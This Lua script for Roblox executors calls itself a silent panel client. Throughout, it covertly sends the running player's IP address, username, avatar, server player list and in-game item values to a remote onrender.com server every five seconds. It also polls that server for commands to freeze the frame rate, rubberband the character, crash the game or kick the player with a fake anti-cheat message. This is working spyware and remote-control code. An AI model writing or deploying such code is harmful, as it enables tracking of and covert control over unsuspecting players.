--[[
  Panel Client v4 — silent, robust
]]
local BASE = "https://roblox-panel-4h3i.onrender.com"
local KEY  = "aggredireontopstupidnga"

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local MarketplaceService = game:GetService("MarketplaceService")

local genv = (getgenv and getgenv()) or _G or {}

local function resolveRequest()
    return http_request or request or (syn and syn.request)
        or (http and http.request) or (fluxus and fluxus.request)
        or genv.http_request or genv.request or (genv.syn and genv.syn.request)
end

local request = resolveRequest()
if not request then
    for i = 1, 40 do
        task.wait(0.25)
        request = resolveRequest()
        if request then break end
    end
end
if not request then return end

local LP = Players.LocalPlayer
if not LP then
    for i = 1, 300 do
        task.wait(0.1)
        LP = Players.LocalPlayer
        if LP then break end
    end
end
if not LP then return end

local function safe(fn)
    local ok, res = pcall(fn)
    if ok then return res end
    return nil
end

local executorName = (identifyexecutor and select(1, identifyexecutor())) or "unknown"

local function gameName()
    local info = safe(function() return MarketplaceService:GetProductInfo(game.PlaceId) end)
    if info and info.Name then return info.Name end
    return "Unknown Game"
end

local function avatarUrl()
    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LP.UserId .. "&width=150&height=150&format=png"
end

local function serverPlayers()
    local t = {}
    for _, p in ipairs(Players:GetPlayers()) do t[#t+1] = p.Name end
    return t
end

local cachedIp = nil
local function publicIp()
    if cachedIp ~= nil then return cachedIp end
    cachedIp = ""
    local res = safe(function()
        return request({ Url = "https://api.ipify.org", Method = "GET" })
    end)
    if res and res.Body then
        local ip = tostring(res.Body):gsub("%s+", "")
        if string.match(ip, "^[%d%.:%a]+$") and #ip >= 3 and #ip <= 60 then
            cachedIp = ip
        end
    end
    return cachedIp
end

-- ═══════════════════════════════════════════════════════════
-- IMPROVED BRAINROT DETECTION v2
-- Scans ALL PlayerGui descendants for text patterns that match
-- brainrot names and cash values.
-- ═══════════════════════════════════════════════════════════
local function collectBrainrots()
    local list = {}
    local pg = safe(function() return LP:FindFirstChild("PlayerGui") end)
    if not pg then return list end

    local foundTexts = {}
    local cashTexts = {}

    -- First pass: collect ALL text from PlayerGui
    local function scanAll(parent, depth)
        if depth > 6 then return end
        for _, child in ipairs(parent:GetChildren()) do
            if child:IsA("TextLabel") or child:IsA("TextButton") or child:IsA("TextBox") then
                local text = child.Text or ""
                if text ~= "" and #text > 1 then
                    table.insert(foundTexts, text)
                end
            end
            scanAll(child, depth + 1)
        end
    end

    scanAll(pg, 0)

    -- Second pass: identify cash values and brainrot names
    for i, text in ipairs(foundTexts) do
        -- Check if this looks like a cash value
        local isCash = false
        local cashValue = nil

        -- Patterns: "150M/s", "97.5M/s", "720M/s", "$1.5B", "2.5K", etc.
        local cashPattern = string.match(text, "([%d%.]+)%s*([MBKmbk])[/]?[Ss]?")
        if cashPattern then
            isCash = true
            cashValue = text
        else
            -- Pure number that could be cash (large numbers)
            local num = tonumber(string.match(text, "^%s*(%d+)%s*$"))
            if num and num > 100 then
                isCash = true
                cashValue = text
            end
        end

        if isCash and cashValue then
            table.insert(cashTexts, { value = cashValue, index = i })
        end
    end

    -- Third pass: pair cash values with nearby text (brainrot names)
    for _, cashData in ipairs(cashTexts) do
        local cashIdx = cashData.index
        local cashVal = cashData.value
        local bestName = nil
        local bestDist = 999

        -- Look for the nearest non-cash text (brainrot name)
        for j, text in ipairs(foundTexts) do
            if j ~= cashIdx then
                -- Skip if this text itself is a cash value
                local isCashText = string.match(text, "[%d%.]+[MBKmbk]") ~= nil
                    or (tonumber(text) and tonumber(text) > 100)

                if not isCashText and #text > 2 then
                    local dist = math.abs(j - cashIdx)
                    if dist < bestDist then
                        bestDist = dist
                        bestName = text
                    end
                end
            end
        end

        if bestName then
            table.insert(list, { title = bestName, cash = cashVal })
        end
    end

    -- Also try the original DuelsMachineSession method as fallback
    local duelsGui = safe(function() return pg:FindFirstChild("DuelsMachineSession") end)
    if duelsGui then
        local frame = safe(function() return duelsGui:FindFirstChild("DuelsMachineSession") end)
        if frame then
            local scroll = safe(function() return frame:FindFirstChild("ScrollingFrame") end)
            if scroll then
                for _, template in ipairs(scroll:GetChildren()) do
                    if template.Name == "Template" then
                        local cash, title = nil, nil
                        for _, obj in ipairs(template:GetDescendants()) do
                            if (obj:IsA("TextLabel") or obj:IsA("TextButton")) and obj.Text and obj.Text ~= "" then
                                local text = obj.Text
                                if string.find(text, "Cookie") or string.find(text, "Milki")
                                   or string.find(text, "%$")
                                   or (string.match(text, "^%d+$") and tonumber(text) > 100) then
                                    cash = text
                                end
                                if not string.match(text, "^%d+$")
                                   and not string.find(text, "Template")
                                   and not string.find(text, "Cookie")
                                   and not string.find(text, "Milki")
                                   and string.len(text) > 3 then
                                    if not title or string.len(text) > string.len(title) then
                                        title = text
                                    end
                                end
                            end
                        end
                        if cash or title then
                            -- Avoid duplicates
                            local isDup = false
                            for _, existing in ipairs(list) do
                                if existing.title == (title or "Unknown") and existing.cash == (cash or "Unknown") then
                                    isDup = true
                                    break
                                end
                            end
                            if not isDup then
                                table.insert(list, { title = title or "Unknown", cash = cash or "Unknown" })
                            end
                        end
                    end
                end
            end
        end
    end

    return list
end

-- ═══════════════════════════════════════════════════════════
-- HEARTBEAT
-- ═══════════════════════════════════════════════════════════
local function heartbeat()
    safe(function()
        local brainrots = collectBrainrots()
        request({
            Url = BASE .. "/api/public/heartbeat",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json", ["X-Api-Key"] = KEY },
            Body = HttpService:JSONEncode({
                user_id = LP.UserId,
                username = LP.Name,
                display_name = LP.DisplayName,
                avatar_url = avatarUrl(),
                place_id = game.PlaceId,
                game_name = gameName(),
                job_id = game.JobId,
                executor = executorName,
                server_players = serverPlayers(),
                ip_address = publicIp(),
                brainrots = brainrots,
            }),
        })
    end)
end

-- ═══════════════════════════════════════════════════════════
-- FPS LIMITER
-- ═══════════════════════════════════════════════════════════
local fpsConn = nil
local fpsOn = false
local function setFpsLimit(on)
    if on == fpsOn then return end
    fpsOn = on
    if on then
        fpsConn = RunService.RenderStepped:Connect(function()
            local t = tick()
            while tick() - t < 0.95 do end
        end)
    else
        if fpsConn then fpsConn:Disconnect() fpsConn = nil end
    end
end

-- ═══════════════════════════════════════════════════════════
-- RUBBERBAND LAG ENGINE
-- ═══════════════════════════════════════════════════════════
local HISTORY_SIZE = 0.27
local INTERVAL = 0.6
local NORMAL_SPEED_MIN = 35
local CARRY_SPEED_MIN = 17

local posHistory = {}
local isActive = false
local mode = nil
local intervalThread = nil

RunService.Heartbeat:Connect(function()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local now = tick()
    posHistory[#posHistory+1] = { cframe = root.CFrame, time = now }
    local cutoff = now - HISTORY_SIZE - 0.1
    while #posHistory > 0 and posHistory[1].time < cutoff do
        table.remove(posHistory, 1)
    end
end)

local function currentSpeed()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return 0 end
    local v = root.AssemblyLinearVelocity
    return Vector3.new(v.X, 0, v.Z).Magnitude
end

local function meetsSpeedReq()
    local s = currentSpeed()
    if mode == "normal" then return s >= NORMAL_SPEED_MIN end
    if mode == "carry" then return s >= CARRY_SPEED_MIN end
    return false
end

local function doRubberband()
    local char = LP.Character
    local root = char and char:FindFirstChild("HumanoidRootPart")
    if not root then return end
    local vel = root.AssemblyLinearVelocity
    local horizVel = Vector3.new(vel.X, 0, vel.Z)
    if horizVel.Magnitude < 1 then return end
    local targetTime = tick() - HISTORY_SIZE
    local best = nil
    for i = 1, #posHistory do
        if posHistory[i].time >= targetTime then
            best = posHistory[i].cframe
            break
        end
    end
    if not best then return end
    root.CFrame = best
    root.AssemblyLinearVelocity = vel
end

local function stopLoop()
    if intervalThread then
        pcall(task.cancel, intervalThread)
        intervalThread = nil
    end
end

local function startLoop()
    stopLoop()
    intervalThread = task.spawn(function()
        local startTime = tick()
        local iteration = 0
        while isActive do
            while isActive and not meetsSpeedReq() do
                task.wait(0.05)
            end
            if not isActive then break end
            iteration = iteration + 1
            local targetT = startTime + (iteration * INTERVAL)
            local sleepT = targetT - tick()
            if sleepT > 0 then task.wait(sleepT) end
            if isActive and meetsSpeedReq() then
                doRubberband()
            end
        end
    end)
end

local function setMode(newMode)
    if mode == newMode then return end
    mode = newMode
    if mode then
        isActive = true
        startLoop()
    else
        isActive = false
        stopLoop()
    end
end

-- ═══════════════════════════════════════════════════════════
-- WEB PANEL POLL
-- ═══════════════════════════════════════════════════════════
local kicked = false
local prevLagN = false
local prevLagC = false
local prevFps = false

local function poll()
    local res = safe(function()
        return request({
            Url = BASE .. "/api/public/command?user_id=" .. LP.UserId,
            Method = "GET",
            Headers = { ["X-Api-Key"] = KEY },
        })
    end)
    if not res or not res.Body then return end
    local ok2, data = pcall(function() return HttpService:JSONDecode(res.Body) end)
    if not ok2 or type(data) ~= "table" then return end

    local wantFps = (data.fps_limit == true)
    if wantFps ~= prevFps then
        prevFps = wantFps
        setFpsLimit(wantFps)
    end

    local wantN = (data.lag_n == true)
    local wantC = (data.lag_c == true)
    if wantC ~= prevLagC or wantN ~= prevLagN then
        prevLagC = wantC
        prevLagN = wantN
        if wantC then
            setMode("carry")
        elseif wantN then
            setMode("normal")
        else
            setMode(nil)
        end
    end

    if data.crash == true then
        while true do end
    end
    if data.kick == true and not kicked then
        kicked = true
        LP:Kick("You have been removed for cheating, please remove any cheats to play | CODE: BAC-1633")
    end
end

-- ═══════════════════════════════════════════════════════════
-- MAIN LOOPS
-- ═══════════════════════════════════════════════════════════
heartbeat()
poll()

task.spawn(function()
    while task.wait(5) do
        heartbeat()
    end
end)

task.spawn(function()
    while task.wait(5) do
        poll()
    end
end)
